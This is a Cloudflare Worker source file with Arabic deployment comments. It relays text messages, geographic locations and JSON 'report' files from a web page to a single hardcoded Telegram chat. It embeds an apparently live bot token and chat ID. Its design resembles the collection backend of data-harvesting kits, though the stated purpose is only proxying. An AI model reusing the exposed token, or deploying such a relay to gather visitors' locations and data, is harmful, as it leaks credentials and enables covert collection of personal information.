// ============================================
// Cloudflare Worker - Telegram Proxy
// ============================================
// هذا الملف يُنشر على Cloudflare Workers (مجاني)
// التوكن يبقى على السيرفر فقط ولا يصل للمتصفح أبداً
//
// خطوات النشر:
// 1. اذهب إلى https://workers.cloudflare.com
// 2. أنشئ حساب مجاني
// 3. اضغط "Create a Service"
// 4. الصق هذا الكود
// 5. اضغط "Save and Deploy"
// 6. انسخ رابط الـ Worker (مثل: https://your-worker.username.workers.dev)
// 7. ضع الرابط في ملف send.js بدل الرابط القديم
// ============================================

const BOT_TOKEN = '7977639190:AAF2dKk3qy7GIwMcZ-YrbteEcXdmlVBwGR4';
const CHAT_ID = '6807742530';
const SECRET_KEY = 'YOUR_SECRET_KEY_CHANGE_THIS_123'; // غيّر هذا لمفتاح خاص بك

export default {
    async fetch(request) {
        // CORS headers
        const corsHeaders = {
            'Access-Control-Allow-Origin': '*',
            'Access-Control-Allow-Methods': 'POST, OPTIONS',
            'Access-Control-Allow-Headers': 'Content-Type, X-Auth-Key',
        };

        // Handle preflight
        if (request.method === 'OPTIONS') {
            return new Response(null, { headers: corsHeaders });
        }

        if (request.method !== 'POST') {
            return new Response('Method not allowed', { status: 405, headers: corsHeaders });
        }

        // Verify secret key
        const authKey = request.headers.get('X-Auth-Key');
        if (authKey !== SECRET_KEY) {
            return new Response('Unauthorized', { status: 401, headers: corsHeaders });
        }

        try {
            const body = await request.json();
            const { action, data } = body;

            let telegramUrl;
            let telegramBody;

            switch (action) {
                case 'sendMessage':
                    telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
                    telegramBody = JSON.stringify({
                        chat_id: CHAT_ID,
                        text: data.text,
                        parse_mode: data.parse_mode || 'Markdown'
                    });
                    break;

                case 'sendLocation':
                    telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`;
                    telegramBody = JSON.stringify({
                        chat_id: CHAT_ID,
                        latitude: data.latitude,
                        longitude: data.longitude
                    });
                    break;

                case 'sendDocument':
                    telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`;
                    const formData = new FormData();
                    formData.append('chat_id', CHAT_ID);
                    formData.append('document', new Blob([JSON.stringify(data.content, null, 2)], { type: 'application/json' }), data.filename || 'report.json');
                    formData.append('caption', data.caption || '');

                    const docResp = await fetch(telegramUrl, { method: 'POST', body: formData });
                    const docResult = await docResp.json();
                    return new Response(JSON.stringify({ ok: docResult.ok }), {
                        headers: { ...corsHeaders, 'Content-Type': 'application/json' }
                    });

                default:
                    return new Response('Invalid action', { status: 400, headers: corsHeaders });
            }

            const resp = await fetch(telegramUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: telegramBody
            });

            const result = await resp.json();
            return new Response(JSON.stringify({ ok: result.ok }), {
                headers: { ...corsHeaders, 'Content-Type': 'application/json' }
            });

        } catch (e) {
            return new Response(JSON.stringify({ error: e.message }), {
                status: 500,
                headers: { ...corsHeaders, 'Content-Type': 'application/json' }
            });
        }
    }
};
